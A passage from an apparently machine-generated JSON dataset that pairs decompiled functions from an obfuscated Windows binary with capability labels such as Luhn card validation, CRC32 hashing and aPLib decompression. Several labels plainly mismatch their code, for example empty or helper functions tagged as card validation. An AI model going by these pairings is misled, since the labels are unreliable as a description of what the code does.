fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ogdxwuapgzhmdanvlbgzparyotwbxuancqztmljdnngfflcfajgfiwftmgpihzwdlkvmj\", &fcn.0042083e::var_2edh);\n    fcn.0041eea2(*0x522f00, *0x522f00 >> 0x20, *0x522ef8, *0x522ef8 >> 0x20, *0x522ef0, *0x522ef0 >> 0x20, 0, 0x5d8, \n                 *0x522ee8, *0x522ee8 >> 0x20, 0, 0x195, &fcn.0042083e::var_309h + 1, *0x522ee0, *0x522ee0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041f076(0xe4e, 1, *0x522f08, *0x522f08 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041f2b6(&fcn.0042083e::var_2edh + 1, *0x522f10, *0x522f10 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"livhrsbcwklowglvbstnsdjaswjnfwznaktrfogqurlyjxkgyzpujulobeactqtvyyyyxkbgtuqhzyuifqqgakngqejtbhgu\", \n                 &fcn.0042083e::var_2b5h);\n    fcn.0041f324(&fcn.0042083e::var_2d1h + 1, 1, *0x522f18, *0x522f18 >> 0x20, 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"edsnxgbelpgurbvxzcxlbyejcfduotssxpwwioekbpkjplx\", &fcn.0042083e::var_299h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041f3ce(&fcn.0042083e::var_299h + 1, *0x522f20, *0x522f20 >> 0x20, 1, 1, &fcn.0042083e::var_2b5h + 1, 0x474, \n                 0xc9a, 0x62a, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x4211d5, in_stack_fffff8b8);\n    fcn.004b21e0(\"rypjxqvosowpievqcozkwvcdzimbiazpcpvoipjzosgymlceobfyacelevdhqijapisj\", &fcn.0042083e::var_261h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"mlsprbjculegecvbnzwbfaremchyidhgzwskxsmpdflxmvmnpto\", &fcn.0042083e::var_245h);\n    fcn.0041f68c(&fcn.0042083e::var_261h + 1, 0x75a, *0x522f30, *0x522f30 >> 0x20, &fcn.0042083e::var_27dh + 1, \n                 *0x522f28, *0x522f28 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x4212a6, in_stack_fffff88c);\n    fcn.004b21e0(\"zywmxkwbtyphnhdbruuwgpqqpldxmsfwoakqlszvczkvgpcmltlhdtkrvlibmwnu\", &fcn.0042083e::var_211h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"pcjgnn\", &fcn.0042083e::var_1f5h);\n    fcn.0041f908(param_1, &fcn.0042083e::var_211h + 1, *0x522f40, *0x522f40 >> 0x20, &fcn.0042083e::var_22ch, 0x686, 0, \n                 0x10b2, *0x522f38, *0x522f38 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0041fa32(*0x522f48, *0x522f48 >> 0x20, 1, 1);\n    fcn.0041def8();\n    fcn.00483110();\n    fcn.004b21e0(\"kbhavdkojyzhibsdlshlsqeyzsouucuyjuorux\", &fcn.0042083e::var_1c1h);\n    fcn.00483110();\n    fcn.004b21e0(\"dxmrmwrrxsiyhgifkfwhutstkmsjzlyz\", &fcn.0042083e::var_1a5h);\n    uVar4 = 0x42142f;\n    fcn.0041dfb4(param_1, &fcn.0042083e::var_1c1h + 1, &fcn.0042083e::var_1dch);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"zqkyfcwpqmomvfjghggrrpetfjwtmsayvnpudywaatugzai\", &fcn.0042083e::var_189h, uVar4);\n    fcn.0041e010(0, 1, &fcn.0042083e::var_1a5h + 1, *0x522f58, *0x522f58 >> 0x20, *0x522f50, *0x522f50 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"yiqukhsqagk\", &fcn.0042083e::var_16dh);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041e068(&fcn.0042083e::var_16dh + 1, *0x522f70, *0x522f70 >> 0x20, 1, 1, &fcn.0042083e::var_189h + 1, 1, 0x679\n                 , 0x814, *0x522f68, *0x522f68 >> 0x20, *0x522f60, *0x522f60 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ftygqlcmkruiwfhkbgnrqvaytanjwobbslklowwettxcqzaojdqrc\", &fcn.0042083e::var_135h);\n    fcn.0041e0bc(&fcn.0042083e::var_151h + 1, 0, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    puVar3 = &fcn.0042083e::var_101h;\n    pcVar2 = \"ivqtdnysbwlgeft\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"cnsewzutwfyjicutbjjfqkhdpgcdqxoxiiybmkaxjanrlzxk\", &fcn.0042083e::var_e5h, pcVar2, puVar3);\n    fcn.0041e4cc(param_1, &fcn.0042083e::var_101h + 1, 0x450, *0x522f78, *0x522f78 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x421771, in_stack_fffff780);\n    fcn.004b21e0(\"chycserrwezvzj\", &fcn.0042083e::var_c9h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"izreamtkrzwdvvzdshcvkkcwavegvtllkvdyoaebvxnzclwpnuegcucstsjbr\", &fcn.0042083e::var_adh);\n    fcn.0041e6ee(*0x522f98, *0x522f98 >> 0x20, *0x522f90, *0x522f90 >> 0x20, 0xef5, *0x522f88, *0x522f88 >> 0x20, \n                 *0x522f80, *0x522f80 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"tcvmrnukiaixfshmjpkbujfpyxlodtusqwundqjwnwudbhfllhypgkubbzidicmggbiqspz\", &fcn.0042083e::var_79h);\n    fcn.00483110();\n    fcn.004b21e0(\"fdwildhsou\", &fcn.0042083e::var_5dh);\n    fcn.0041e804(param_1, 1, *0x522fa8, *0x522fa8 >> 0x20, *0x522fa0, *0x522fa0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"qcpsfx\", &fcn.0042083e::var_41h);\n    fcn.0041e980(&fcn.0042083e::var_5dh + 1, 0x610);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"vrcphfopwodfdjpuyryyquitcicxmxiythrmimfvimwpmxixmsmsawjlkapldrszckzzsczwpijiwnhzqvdpjrndaugl\", \n                 &fcn.0042083e::var_25h);\n    fcn.00483110();\n    fcn.004b21e0(\"nraiiqsinhotenefrlumbrxyhglyxmecttljlzzvorspuczisqrsvjvwqsfpxfxqifaqrnzscbqtxulbxlrtlogrzlhbfxy\", \n                 &fcn.0042083e::var_9h);\n    fcn.0041eb58(&fcn.0042083e::var_25h + 1, &fcn.0042083e::var_41h + 1, 0, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 5136
    },
    "0042252a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0042252a(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint arg_30h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    return;\n}\n",
        "token_count": 134
    },
    "00427578": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.00427578(uint param_1)\n\n{\n    uint var_2fch;\n    uint var_2ech;\n    uint var_2d1h;\n    uint var_2b5h;\n    uint var_299h;\n    uint var_280h;\n    uint var_265h;\n    uint var_249h;\n    uint var_22dh;\n    uint var_211h;\n    uint var_1f5h;\n    uint var_1d9h;\n    uint var_1c0h;\n    uint var_1a5h;\n    uint var_189h;\n    uint var_16dh;\n    uint var_151h;\n    uint var_135h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_ach;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_40h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"pitmkclqxtyd\", &var_2d1h);\n    fcn.00483110();\n    fcn.004b21e0(\"mqcuxuk\", &var_2b5h);\n    fcn.00483110();\n    fcn.004b21e0(\"issggygqczhy\", &var_299h);\n    fcn.00426bc4();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00426db0(*0x5232f8, *0x5232f8 >> 0x20, 0x284, *0x5232f0, *0x5232f0 >> 0x20, 0, 1, 0x1640, 1, 1, *0x5232e8, \n                 *0x5232e8 >> 0x20, *0x5232e0, *0x5232e0 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"aizadv\", &var_265h);\n    fcn.00426e44(param_1, 0xcc4, &var_280h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00426ec4();\n    fcn.00483110();\n    fcn.004b21e0(\"jubdsafouwsiggnsdufrxlowltftuqjxxoflvepppukoqsefugkkofrmdzhaqqhkelmbrvwviathpprf\", &var_249h);\n    fcn.00426f7c(*0x523300, *0x523300 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ezkisgwutydxxfgrtabdwvtjytcnawgkkhyqzmbv\", &var_22dh);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.004270e6(&var_22dh + 1, *0x523318, *0x523318 >> 0x20, 1, *0x523310, *0x523310 >> 0x20, &var_249h + 1, 1, \n                 *0x523308, *0x523308 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"mdeebrrpdamesogqcpuscjrvecbrjxarffvmjxlzplekjyrtcumkyipfghhgnwmijjwtnisentocysctfglwnfbcjvd\", \n                 &var_1f5h);\n    fcn.00483110();\n    fcn.004b21e0(\"ssjiddympueqsyxjkpjmruiqorixdjovchvv\", &var_1d9h);\n    fcn.00427170(*0x523328, *0x523328 >> 0x20, *0x523320, *0x523320 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hokvoxpyuknmqogvponqkgfmimxtjcsdebyoztquuxuaywnpmtgmhamfrnfnvcjaqxmuoigtuxbksemzlqviponjdwykxijkszt\", \n                 &var_1a5h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.00427222(param_1, &var_1a5h + 1, &var_1c0h, 0, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"fcewlfxdqyvakongpanocwyqvixezzcjgcsmxcltprpuslexjwddoq\", &var_16dh);\n    fcn.00483110();\n    fcn.004b21e0(\"dynnguxcljtskdcpjbnldiofdkmiysxlclcxrtvutwgovncvkoleqddxrvhgojg\", &var_151h);\n    fcn.00483110();\n    fcn.004b21e0(\"pxfyxtufizlunezrkfzbozuraneqccxhjmiawpsohrvgqgomabxhfah\", &var_135h);\n    fcn.00427326(*0x523348, *0x523348 >> 0x20, *0x523340, *0x523340 >> 0x20, 0x2be, &var_151h + 1, 0xc1c, *0x523338, \n                 *0x523338 >> 0x20, &var_16dh + 1, 1, &var_189h + 1, *0x523330, *0x523330 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"uucedlhplhmajqabjgkmlxgymryuwxkwfhwofmitnshgfxmjnxqxtukufytikriorphpgv\", &var_119h);\n    fcn.00483110();\n    fcn.004b21e0(\"agpvdiubketwhjfuhbpgbikyerfzzlfnpvfseoyvammpawxfoficuqkgkokxojkqszizosrujmndhser\", &var_fdh);\n    fcn.0042738c(&var_119h + 1, &var_135h + 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x520b3d, &var_e1h);\n    fcn.004261a0(*0x523350, *0x523350 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.004262c2(*0x523360, *0x523360 >> 0x20, &var_e1h + 1, 0, *0x523358, *0x523358 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004263b2(0, 0x52a, *0x523388, *0x523388 >> 0x20, *0x523380, *0x523380 >> 0x20, *0x523378, *0x523378 >> 0x20, \n                 *0x523370, *0x523370 >> 0x20, *0x523368, *0x523368 >> 0x20);\n    fcn.00426784(*0x523390, *0x523390 >> 0x20, 0);\n    fcn.004268e0(*0x523398, *0x523398 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"iubcgarznejcxoudtndlxrupbd\", &var_91h);\n    fcn.00483110();\n    fcn.004b21e0(\"zvnhbcocasjeiyndfpdzfuepqgedwdmyuqgsswtdwgygzhhfmdstuthdyhslyxogbzvjjdgsjfcyrvayuwwavoybtzdvvjidj\", \n                 &var_75h);\n    fcn.00426902(param_1, &var_91h + 1, *0x5233b8, *0x5233b8 >> 0x20, *0x5233b0, *0x5233b0 >> 0x20, *0x5233a8, \n                 *0x5233a8 >> 0x20, &var_ach, *0x5233a0, *0x5233a0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ljjvxgx\", &var_59h);\n    fcn.00425d06(1, &var_75h + 1, 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00425d96();\n    fcn.00483110();\n    fcn.004b21e0(\"lphifegkktwkylfxmpkhhcdkxdzyrkfqimzgveeloemipmnwrapettkzrlernwuxsgztnwvzutnzskslgsfvrt\", &var_25h);\n    fcn.00425db4(param_1, 0x19ec, 0, *0x5233d0, *0x5233d0 >> 0x20, &var_40h, *0x5233c8, *0x5233c8 >> 0x20, *0x5233c0, \n                 *0x5233c0 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ptrbmdldzowujskikchfmeyvpgetixoehzuliirynuojlimklbekfauierwerumf\", &var_9h);\n    fcn.0042615c(0x126e, &var_25h + 1, 1, *0x5233e8, *0x5233e8 >> 0x20, *0x5233e0, *0x5233e0 >> 0x20, 0x1ddd, *0x5233d8\n                 , *0x5233d8 >> 0x20, 0xf46, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2904
    },
    "0043ca70": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nvoid fcn.0043ca70(ushort *param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    uint uVar1;\n    uint uVar2;\n    ushort uStack14;\n    \n    uStack14 = 0;\n    if (param_1 == NULL) {\n        param_1 = &uStack14;\n    }\n    uVar1 = sub.msvcrt.dll____mb_cur_max_func();\n    uVar2 = fcn.00447090();\n    if (param_4 == 0) {\n        param_4 = 0x56b434;\n    }\n    fcn.0043c8f0(param_1, param_2, param_3, param_4, uVar2, uVar1);\n    return;\n}\n",
        "token_count": 174
    },
    "004896c0": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.004896c0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    iVar1 = *arg_8h;\n    in_ECX[2] = 0;\n    if ((*(arg_8h + *(iVar1 + -0xc) + 0x14) & 5) == 0) {\n        piVar2 = *(arg_8h + *(iVar1 + -0xc) + 0x78);\n        (**(*piVar2 + 0x10))(piVar2, 0, 0, 1, 0x10);\n        *in_ECX = var_18h;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0049f380": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __cdecl fcn.0049f380(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint *in_ECX;\n    uint var_18h;\n    uint var_14h;\n    uint var_bp_10h;\n    uint var_8h;\n    \n    *in_ECX = 0xffffffff;\n    in_ECX[1] = 0xffffffff;\n    iVar1 = *arg_8h;\n    in_ECX[2] = 0;\n    if ((*(arg_8h + *(iVar1 + -0xc) + 0x14) & 5) == 0) {\n        piVar2 = *(arg_8h + *(iVar1 + -0xc) + 0x78);\n        (**(*piVar2 + 0x10))(piVar2, 0, 0, 1, 0x10);\n        *in_ECX = var_18h;\n        in_ECX[1] = var_14h;\n        in_ECX[2] = var_bp_10h;\n    }\n    return;\n}\n",
        "token_count": 264
    },
    "0043abb0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043abb0(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar1 = *(param_1 + 4);\n    uVar4 = uVar1 >> 1;\n    while (uVar4 = uVar4 - 1,  uVar4 != 0xffffffff) {\n        fcn.0043aaf0(uVar4, uVar1);\n    }\n    iVar3 = uVar1 - 1;\n    if (0 < iVar3) {\n        do {\n            uVar2 = *(param_1 + 8);\n            *(param_1 + 8) = *(param_1 + 8 + iVar3 * 4);\n            *(param_1 + 8 + iVar3 * 4) = uVar2;\n            fcn.0043aaf0(0, iVar3);\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "00442730": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nvoid fcn.00442730(float10 param_1)\n\n{\n    int32_t iVar1;\n    uint16_t uVar2;\n    int32_t in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint8_t *puVar10;\n    int16_t iVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    int32_t iVar14;\n    uint32_t uStack136;\n    uint8_t *puStack124;\n    uint32_t uStack120;\n    uint16_t uStack116;\n    uint32_t uStack108;\n    uint32_t uStack104;\n    uint16_t uStack84;\n    uint8_t uStack52;\n    uint8_t auStack51 [35];\n    \n    if (((param_1 != 0) << 10 | (param_1 == 0) << 0xe) == 0x100) {\n        fcn.004417e0();\n        return;\n    }\n    uStack84 = param_1 >> 0x40;\n    if (param_1 < 0) {\n        *(in_EAX + 4) = *(in_EAX + 4) | 0x80;\n    }\n    if (((param_1 != 0) << 10 | (param_1 == 0) << 0xe) == 0x500) {\n        fcn.004417e0();\n        return;\n    }\n    uStack116 = uStack84 & 0x7fff;\n    uStack108 = SUB104(param_1, 0);\n    uStack104 = param_1 >> 0x20;\n    if ((param_1 & 0x7fff) == 0) {\n        uStack136 = uStack104;\n        if ((uStack104 | uStack108) == 0) {\n            uVar9 = *(in_EAX + 0xc);\n            if (0xe < uVar9) {\n                uStack120 = *(in_EAX + 4);\n                goto code_r0x00442980;\n            }\n            do {\n                uStack104 = uStack104 << 1 | uStack108 >> 0x1f;\n                uStack108 = uStack108 * 2;\njoined_r0x00442816:\n                uStack136 = uStack104;\n            } while (-1 < uStack104);\ncode_r0x00442831:\n            uVar8 = (0xe - uVar9) * 4;\n            uVar6 = uVar8;\n            uVar7 = uVar6 & 0x1f;\n            uVar3 = 4 << (uVar6 & 0x1f);\n            uVar4 = uVar3;\n            uVar13 = 0 << uVar7 | 4U >> 0x20 - uVar7;\n            if ((uVar8 & 0x20) != 0) {\n                uVar4 = 0;\n                uVar13 = uVar3;\n            }\n            uVar8 = uStack108 >> 1 | uStack136 << 0x1f;\n            uVar3 = uVar8 + uVar4;\n            uVar13 = (uStack136 >> 1) + uVar13 + CARRY4(uVar8, uVar4);\n            if (uVar13 < 0) {\n                uStack116 = uStack116 + 1;\n            }\n            else {\n                uVar13 = uVar13 * 2 | uVar3 >> 0x1f;\n                uVar3 = uVar3 * 2;\n            }\n            uVar9 = (0xf - uVar9) * 4;\n            uVar6 = uVar9;\n            uVar7 = uVar6 & 0x1f;\n            uVar4 = uVar13 >> (uVar6 & 0x1f);\n            uStack108 = uVar3 >> uVar7 | uVar13 << 0x20 - uVar7;\n            uStack136 = uVar4;\n            if ((uVar9 & 0x20) != 0) {\n                uStack136 = 0;\n                uStack108 = uVar4;\n            }\n        }\n        else {\n            if (uStack104 < 0) {\n                uStack116 = 0xc002;\n            }\n            else {\n                uVar2 = 0xc001;\n                do {\n                    uStack116 = uVar2;\n                    uStack104 = uStack104 << 1 | uStack108 >> 0x1f;\n                    uStack108 = uStack108 * 2;\n                    uStack136 = uStack104;\n                    uVar2 = uStack116 - 1;\n                } while (-1 < uStack104);\n            }\n            uVar9 = *(in_EAX + 0xc);\n            if (uVar9 < 0xf) goto code_r0x00442831;\n        }\n        uStack120 = *(in_EAX + 4);\ncode_r0x00442899:\n        puVar10 = &uStack52;\n        do {\n            uVar9 = uStack108 & 0xf;\n            if ((uVar9 ^ uStack108 | uStack136) == 0) {\n                if (((&uStack52 < puVar10) || ((uStack120 & 0x800) != 0)) || (0 < *(in_EAX + 0xc))) {\n                    *puVar10 = 0x2e;\n                    puVar10 = puVar10 + 1;\n                }\n                uVar13 = uVar9;\n                if ((uStack108 ^ 1 | uStack136) == 0) {\n                    uStack108 = 0;\n                    uStack136 = 0;\n                }\n                else {\n                    do {\n                        uStack116 = uStack116 - 1;\n                        uVar13 = uVar13 >> 1;\n                    } while (uVar13 != 1);\n                    uStack108 = 0;\n                    uStack136 = 0;\n                }\n            }\n            else {\n                uStack108 = uStack108 >> 4 | uStack136 << 0x1c;\n                uStack136 = uStack136 >> 4;\n                if (0 < *(in_EAX + 0xc)) {\n                    *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n                }\n            }\n            if (uVar9 == 0) {\n                uVar9 = 0;\n                if ((&uStack52 < puVar10) || (-1 < *(in_EAX + 0xc))) goto code_r0x004428e2;\n            }\n            else {\n                if (uVar9 < 10) {\ncode_r0x004428e2:\n                    uVar7 = uVar9 + 0x30;\n                }\n                else {\n                    uVar7 = uVar9 + 0x37U | uStack120 & 0x20;\n                }\n                *puVar10 = uVar7;\n                puVar10 = puVar10 + 1;\n            }\n        } while ((uStack136 | uStack108) != 0);\n        if (puVar10 != &uStack52) {\n            iVar1 = *(in_EAX + 8);\n            goto joined_r0x00442be6;\n        }\n    }\n    else {\n        uVar9 = *(in_EAX + 0xc);\n        uStack116 = uStack116 + 0xc001;\n        uStack136 = uStack104;\n        if (uVar9 < 0xf) goto joined_r0x00442816;\n        uStack120 = *(in_EAX + 4);\n        if ((uStack104 | uStack108) != 0) goto code_r0x00442899;\n    }\ncode_r0x00442980:\n    puStack124 = &uStack52;\n    if ((0 < *(in_EAX + 0xc)) || ((uStack120 & 0x800) != 0)) {\n        puStack124 = auStack51;\n        uStack52 = 0x2e;\n    }\n    puVar10 = puStack124 + 1;\n    *puStack124 = 0x30;\n    iVar1 = *(in_EAX + 8);\njoined_r0x00442be6:\n    if (iVar1 < 1) {\n        iVar5 = uStack116;\n        iVar12 = 2;\n    }\n    else {\n        puStack124 = &uStack52;\n        iVar5 = uStack116;\n        iVar14 = puVar10 - puStack124;\n        if (0 < *(in_EAX + 0xc)) {\n            iVar14 = (puVar10 - puStack124) + *(in_EAX + 0xc);\n        }\n        iVar14 = iVar14 + 5 + ((uStack120 & 0x1c0) != 0);\n        iVar12 = iVar5 / 10;\n        if (iVar12 == 0) {\n            iVar12 = 2;\n        }\n        else {\n            iVar11 = 2;\n            do {\n                iVar14 = iVar14 + 1;\n                iVar11 = iVar11 + 1;\n                iVar12 = iVar12 / 10;\n            } while (iVar12 != 0);\n            iVar12 = iVar11;\n        }\n        if (iVar14 < iVar1) {\n            if ((uStack120 & 0x600) == 0) {\n                *(in_EAX + 8) = (iVar1 - iVar14) + -1;\n                do {\n                    fcn.00441540(iVar5);\n                    iVar1 = *(in_EAX + 8);\n                    *(in_EAX + 8) = iVar1 + -1;\n                } while (0 < iVar1);\n                uStack120 = *(in_EAX + 4);\n            }\n            else {\n                *(in_EAX + 8) = iVar1 - iVar14;\n            }\n        }\n        else {\n            *(in_EAX + 8) = 0xffffffff;\n        }\n    }\n    if ((uStack120 & 0x80) == 0) {\n        if ((uStack120 & 0x100) == 0) {\n            if ((uStack120 & 0x40) != 0) {\n                fcn.00441540(iVar5);\n            }\n        }\n        else {\n            fcn.00441540(iVar5);\n        }\n    }\n    else {\n        fcn.00441540(iVar5);\n    }\n    puStack124 = &uStack52;\n    fcn.00441540(iVar5);\n    fcn.00441540();\n    if ((0 < *(in_EAX + 8)) && ((*(in_EAX + 5) & 2) != 0)) {\n        *(in_EAX + 8) = *(in_EAX + 8) + -1;\n        do {\n            fcn.00441540();\n            iVar1 = *(in_EAX + 8);\n            *(in_EAX + 8) = iVar1 + -1;\n        } while (0 < iVar1);\n    }\n    if (puStack124 < puVar10) {\n        do {\n            puVar10 = puVar10 + -1;\n            if (*puVar10 == 0x2e) {\n                fcn.00441880();\n            }\n            else if (*puVar10 == 0x2c) {\n                if (*(in_EAX + 0x1c) != 0) {\n                    fcn.004415a0();\n                }\n            }\n            else {\n                fcn.00441540();\n            }\n        } while (puVar10 != puStack124);\n    }\n    while (iVar1 = *(in_EAX + 0xc),  *(in_EAX + 0xc) = iVar1 + -1,  0 < iVar1) {\n        fcn.00441540();\n    }\n    fcn.00441540();\n    *(in_EAX + 8) = *(in_EAX + 8) + iVar12;\n    *(in_EAX + 4) = *(in_EAX + 4) | 0x1c0;\n    fcn.00441da0();\n    return;\n}\n",
        "token_count": 2697
    },
    "004838f0": {
        "rules": [
            "hash data with CRC32/a4d5eed7afd042fc93e3f1fa27687e43",
            "decompress data using aPLib/068152e73b06436aa790bef7a99b301a"
        ],
        "decompiled_code": "\nint32_t fcn.004838f0(uint32_t param_1, uint32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *extraout_ECX;\n    \n    if (param_1 < 0x1fffffff) {\n        if (param_2 < param_1) {\n            if (param_1 < param_2 * 2) {\n                param_1 = param_2 * 2;\n            }\n            iVar3 = param_1 * 2 + 0xe;\n            uVar1 = param_1 * 2 + 0x1e;\n            if ((0x1000 < uVar1) && (param_2 < param_1)) {\n                param_1 = param_1 + (0x1000 - (uVar1 & 0xfff) >> 1);\n                if (0x1ffffffe < param_1) {\n                    param_1 = 0x1ffffffe;\n                }\n                iVar3 = param_1 * 2 + 0xe;\n            }\n        }\n        else {\n            iVar3 = param_1 * 2 + 0xe;\n        }\n        iVar3 = fcn.004c2c70(iVar3);\n        *(iVar3 + 4) = param_1;\n        *(iVar3 + 8) = 0;\n        return iVar3;\n    }\n    fcn.004be310(\"basic_string::_S_create\");\n    iVar3 = *extraout_ECX;\n    iVar2 = *(iVar3 + -0xc);\n    if (-1 < *(iVar3 + 